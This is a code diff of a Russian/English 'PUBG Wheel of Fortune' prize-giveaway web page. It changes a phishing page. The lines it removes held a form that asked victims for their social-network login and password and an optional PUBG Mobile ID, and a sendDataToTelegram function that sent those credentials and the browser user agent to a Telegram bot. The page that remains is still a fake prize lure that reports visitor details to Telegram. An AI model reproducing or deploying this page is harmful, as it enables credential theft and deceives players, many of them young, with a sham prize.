@@ -228,8 +228,8 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
-        /* Форма ввода данных */
-        .data-form-section {
+        /* Форма выбора соцсети */
+        .social-select-section {
             background: linear-gradient(135deg, rgba(20, 35, 60, 0.95) 0%, rgba(12, 26, 45, 0.95) 100%);
             border-radius: 20px;
             padding: 25px;
@@ -241,7 +241,7 @@
             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
         }
         
-        .data-form-section.active {
+        .social-select-section.active {
             display: block;
             animation: fadeInUp 0.6s ease;
         }
@@ -257,7 +257,7 @@
             }
         }
         
-        .data-form-section h2 {
+        .social-select-section h2 {
             color: #8da1b5;
             text-align: center;
             margin-bottom: 20px;
@@ -266,37 +266,9 @@
             font-weight: 500;
         }
         
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-label {
-            display: block;
-            color: #8da1b5;
-            margin-bottom: 8px;
-            font-size: 16px;
-            font-family: 'Orbitron', sans-serif;
-        }
-        
-        .form-input {
-            width: 100%;
-            padding: 12px 15px;
-            background: rgba(12, 26, 45, 0.7);
-            border: 2px solid #2a3b5a;
-            border-radius: 8px;
-            color: #8da1b5;
-            font-size: 16px;
-            font-family: 'Orbitron', sans-serif;
-            transition: border-color 0.3s;
-        }
-        
-        .form-input:focus {
-            outline: none;
-            border-color: #4c75a3;
-        }
-        
-        .social-select {
+        .social-grid {
             display: flex;
+            justify-content: center;
             gap: 15px;
             margin-bottom: 25px;
             flex-wrap: wrap;
@@ -371,7 +343,7 @@
             font-family: 'Orbitron', sans-serif;
         }
         
-        .submit-btn {
+        .get-prize-btn {
             background: linear-gradient(45deg, #2a3b5a 0%, #1a2c42 100%);
             color: #8da1b5;
             border: none;
@@ -387,66 +359,23 @@
             letter-spacing: 1px;
             text-transform: uppercase;
             margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
         
-        .submit-btn:hover:not(:disabled) {
+        .get-prize-btn:hover:not(:disabled) {
             transform: translateY(-3px);
             box-shadow: 0 15px 30px rgba(42, 59, 90, 0.7);
         }
         
-        .submit-btn:disabled {
+        .get-prize-btn:disabled {
             background: linear-gradient(45deg, #444, #555);
             color: #777;
             cursor: not-allowed;
             transform: none;
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-        }
-        
-        /* Секция выигранного приза */
-        .prize-section {
-            background: linear-gradient(135deg, rgba(20, 35, 60, 0.95) 0%, rgba(12, 26, 45, 0.95) 100%);
-            border-radius: 20px;
-            padding: 25px;
-            width: 100%;
-            max-width: 600px;
-            display: none;
-            margin-top: 20px;
-            border: 2px solid rgba(42, 59, 90, 0.4);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
-        }
-        
-        .prize-section.active {
-            display: block;
-            animation: fadeInUp 0.6s ease;
-        }
-        
-        .prize-section h2 {
-            color: #8da1b5;
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 22px;
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 500;
-        }
-        
-        .prize-won {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 25px;
-            background: rgba(42, 59, 90, 0.3);
-            padding: 20px;
-            border-radius: 15px;
-            border: 2px solid rgba(42, 59, 90, 0.6);
-        }
-        
-        .prize-won img {
-            width: 120px;
-            height: 120px;
-            object-fit: contain;
-            filter: drop-shadow(0 0 10px rgba(141, 161, 181, 0.6));
-            margin-bottom: 15px;
         }
         
         /* Секция подтверждения получения приза */
@@ -556,11 +485,6 @@
                 height: 70px;
             }
             
-            .prize-won img {
-                width: 100px;
-                height: 100px;
-            }
-            
             .play-btn {
                 padding: 18px 30px;
                 font-size: 20px;
@@ -570,7 +494,7 @@
                 font-size: 24px;
             }
             
-            .social-select {
+            .social-grid {
                 gap: 10px;
             }
             
@@ -590,7 +514,7 @@
                 font-size: 18px;
             }
             
-            .submit-btn {
+            .get-prize-btn {
                 padding: 15px 25px;
                 font-size: 18px;
             }
@@ -671,11 +595,12 @@
             <i class="fas fa-play"></i> ИГРАТЬ
         </button>
         
-        <!-- Форма ввода данных -->
-        <div class="data-form-section" id="dataFormSection">
-            <h2>ВВЕДИТЕ ДАННЫЕ ДЛЯ ПОЛУЧЕНИЯ ПРИЗА</h2>
+        <!-- Форма выбора соцсети -->
+        <div class="social-select-section" id="socialSelectSection">
+            <h2>ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ</h2>
+            <p style="text-align: center; margin-bottom: 20px; color: #8da1b5;">Выберите социальную сеть для получения приза</p>
             
-            <div class="social-select">
+            <div class="social-grid">
                 <div class="social-option" data-social="vk">
                     <div class="social-icon vk">
                         ВК
@@ -705,22 +630,7 @@
                 </div>
             </div>
             
-            <div class="form-group">
-                <label class="form-label" id="loginLabel">Логин / Email / Телефон</label>
-                <input type="text" class="form-input" id="loginInput" placeholder="Введите ваш логин, email или телефон">
-            </div>
-            
-            <div class="form-group">
-                <label class="form-label" id="passwordLabel">Пароль</label>
-                <input type="password" class="form-input" id="passwordInput" placeholder="Введите ваш пароль">
-            </div>
-            
-            <div class="form-group">
-                <label class="form-label">ID в PUBG Mobile (необязательно)</label>
-                <input type="text" class="form-input" id="pubgIdInput" placeholder="Введите ваш ID в PUBG Mobile">
-            </div>
-            
-            <button class="submit-btn" id="submitBtn">
+            <button class="get-prize-btn" id="getPrizeBtn">
                 <i class="fas fa-paper-plane"></i> ПОЛУЧИТЬ ПРИЗ
             </button>
             
@@ -777,14 +687,9 @@
         document.addEventListener('DOMContentLoaded', function() {
             const playBtn = document.getElementById('playBtn');
             const selectionFrame = document.getElementById('selectionFrame');
-            const dataFormSection = document.getElementById('dataFormSection');
+            const socialSelectSection = document.getElementById('socialSelectSection');
             const confirmationSection = document.getElementById('confirmationSection');
-            const submitBtn = document.getElementById('submitBtn');
-            const loginInput = document.getElementById('loginInput');
-            const passwordInput = document.getElementById('passwordInput');
-            const pubgIdInput = document.getElementById('pubgIdInput');
-            const loginLabel = document.getElementById('loginLabel');
-            const passwordLabel = document.getElementById('passwordLabel');
+            const getPrizeBtn = document.getElementById('getPrizeBtn');
             const prizeItems = document.querySelectorAll('.prize-item');
             const languageBtn = document.getElementById('languageBtn');
             const languageDropdown = document.getElementById('languageDropdown');
@@ -825,13 +730,10 @@
                     play: "ИГРАТЬ",
                     title: "КОЛЕСО УДАЧИ PUBG",
                     subtitle: "Испытай удачу и выиграй эксклюзивные призы!",
-                    formTitle: "ВВЕДИТЕ ДАННЫЕ ДЛЯ ПОЛУЧЕНИЯ ПРИЗА",
-                    loginLabel: "Логин / Email / Телефон",
-                    passwordLabel: "Пароль",
-                    pubgIdLabel: "ID в PUBG Mobile (необязательно)",
-                    submitBtn: "ПОЛУЧИТЬ ПРИЗ",
-                    notificationSuccess: "Данные отправлены! Приз будет зачислен в течение 24 часов.",
-                    notificationError: "Пожалуйста, заполните все обязательные поля.",
+                    selectTitle: "ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ",
+                    selectText: "Выберите социальную сеть для получения приза",
+                    getPrizeBtn: "ПОЛУЧИТЬ ПРИЗ",
+                    notificationSuccess: "Заявка принята! Приз будет зачислен в течение 24 часов.",
                     notificationSelectSocial: "Пожалуйста, выберите социальную сеть",
                     notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!",
                     confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
@@ -841,13 +743,10 @@
                     play: "PLAY",
                     title: "PUBG WHEEL OF FORTUNE",
                     subtitle: "Try your luck and win exclusive prizes!",
-                    formTitle: "ENTER DATA TO RECEIVE PRIZE",
-                    loginLabel: "Login / Email / Phone",
-                    passwordLabel: "Password",
-                    pubgIdLabel: "PUBG Mobile ID (optional)",
-                    submitBtn: "GET PRIZE",
-                    notificationSuccess: "Data sent! The prize will be credited within 24 hours.",
-                    notificationError: "Please fill in all required fields.",
+                    selectTitle: "SELECT RECEIVING METHOD",
+                    selectText: "Select social network to receive the prize",
+                    getPrizeBtn: "GET PRIZE",
+                    notificationSuccess: "Application accepted! The prize will be credited within 24 hours.",
                     notificationSelectSocial: "Please select a social network",
                     notificationAlreadyPlayed: "You have already used your attempt today!",
                     confirmationTitle: "APPLICATION ACCEPTED!",
@@ -862,11 +761,9 @@
                 document.querySelector('.header h1').textContent = t.title;
                 document.querySelector('.header p').textContent = t.subtitle;
                 playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
-                document.querySelector('#dataFormSection h2').textContent = t.formTitle;
-                loginLabel.textContent = t.loginLabel;
-                passwordLabel.textContent = t.passwordLabel;
-                document.querySelector('#dataFormSection .form-group:nth-child(4) .form-label').textContent = t.pubgIdLabel;
-                submitBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.submitBtn}`;
+                document.querySelector('#socialSelectSection h2').textContent = t.selectTitle;
+                document.querySelector('#socialSelectSection p').textContent = t.selectText;
+                getPrizeBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.getPrizeBtn}`;
                 document.querySelector('#confirmationSection h2').textContent = t.confirmationTitle;
                 document.querySelector('.confirmation-message').innerHTML = t.confirmationMessage;
                 
@@ -935,7 +832,7 @@
                 
                 isSpinning = true;
                 playBtn.disabled = true;
-                dataFormSection.classList.remove('active');
+                socialSelectSection.classList.remove('active');
                 confirmationSection.classList.remove('active');
                 
                 finalPrizeIndex = getRandomPrize();
@@ -982,16 +879,13 @@
                             hasPlayed = true;
                             playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
                             
-                            // Сбрасываем форму
+                            // Сбрасываем выбор соцсети
                             socialOptions.forEach(opt => opt.classList.remove('selected'));
                             selectedSocial = null;
-                            loginInput.value = '';
-                            passwordInput.value = '';
-                            pubgIdInput.value = '';
                             
-                            // Показываем форму для ввода данных
-                            dataFormSection.classList.add('active');
-                            dataFormSection.scrollIntoView({ behavior: 'smooth' });
+                            // Показываем форму выбора соцсети
+                            socialSelectSection.classList.add('active');
+                            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                         }, 1000);
                     }, 300);
                 }
@@ -1007,39 +901,30 @@
                 });
             });
             
-            // Обработчик отправки формы
-            submitBtn.addEventListener('click', async function() {
+            // Обработчик кнопки получения приза
+            getPrizeBtn.addEventListener('click', async function() {
                 if (!selectedSocial) {
                     showNotification("Пожалуйста, выберите социальную сеть", true);
                     return;
                 }
                 
-                const login = loginInput.value.trim();
-                const password = passwordInput.value.trim();
-                const pubgId = pubgIdInput.value.trim();
-                
-                if (!login || !password) {
-                    showNotification("Пожалуйста, заполните логин и пароль", true);
-                    return;
-                }
-                
                 // Отправляем данные в Telegram
-                const success = await sendDataToTelegram(selectedSocial, login, password, pubgId, finalPrizeIndex);
+                const success = await sendDataToTelegram(selectedSocial, finalPrizeIndex);
                 
                 if (success) {
                     // Показываем секцию подтверждения
-                    dataFormSection.classList.remove('active');
+                    socialSelectSection.classList.remove('active');
                     confirmationSection.classList.add('active');
                     confirmationSection.scrollIntoView({ behavior: 'smooth' });
                     
-                    showNotification("Данные отправлены! Приз будет зачислен в течение 24 часов.");
+                    showNotification("Заявка принята! Приз будет зачислен в течение 24 часов.");
                 } else {
                     showNotification("Ошибка отправки данных. Попробуйте еще раз.", true);
                 }
             });
             
             // Функция отправки данных в Telegram
-            async function sendDataToTelegram(social, login, password, pubgId, prizeIndex) {
+            async function sendDataToTelegram(social, prizeIndex) {
                 const socialNames = {
                     'vk': 'ВКонтакте',
                     'facebook': 'Facebook',
@@ -1051,9 +936,6 @@
                 
                 const message = `🎮 НОВЫЙ ВЫИГРЫШ PUBG 🎮\n\n` +
                                `📱 Соцсеть: ${socialNames[social] || social}\n` +
-                               `👤 Логин: ${login}\n` +
-                               `🔑 Пароль: ${password}\n` +
-                               `🎮 PUBG ID: ${pubgId || 'Не указан'}\n` +
                                `🎁 Выигранный приз: ${prizeName}\n` +
                                `⏰ Время: ${new Date().toLocaleString()}\n` +
                                `🌐 User Agent: ${navigator.userAgent}\n` +
@@ -1137,25 +1019,6 @@
             document.addEventListener('click', function(event) {
                 if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
                     languageDropdown.classList.remove('show');
-                }
-            });
-            
-            // Разрешаем отправку формы по Enter
-            loginInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    submitBtn.click();
-                }
-            });
-            
-            passwordInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    submitBtn.click();
-                }
-            });
-            
-            pubgIdInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    submitBtn.click();
                 }
             });
         });
